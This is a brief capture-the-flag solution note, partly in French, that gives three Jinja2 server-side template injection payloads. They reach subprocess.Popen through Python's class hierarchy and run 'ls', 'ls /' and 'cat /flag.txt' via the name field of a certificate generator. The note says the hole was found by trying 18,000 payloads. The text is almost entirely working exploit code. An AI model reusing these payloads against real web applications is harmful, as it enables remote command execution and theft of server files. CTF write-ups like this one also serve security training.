{{ ''.__class__.__mro__[1].__subclasses__()[359]('ls',shell=True,stdout=-1).communicate()[0].decode() }}
{{ ''.__class__.__mro__[1].__subclasses__()[359]('ls /',shell=True,stdout=-1).communicate()[0].decode() }}
{{ ''.__class__.__mro__[1].__subclasses__()[359]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].decode() }}


en gros c'est une ssti dans le champ name de laa génération de certificat !
donc bah classique ssti avec test de 18 000 paylaods. 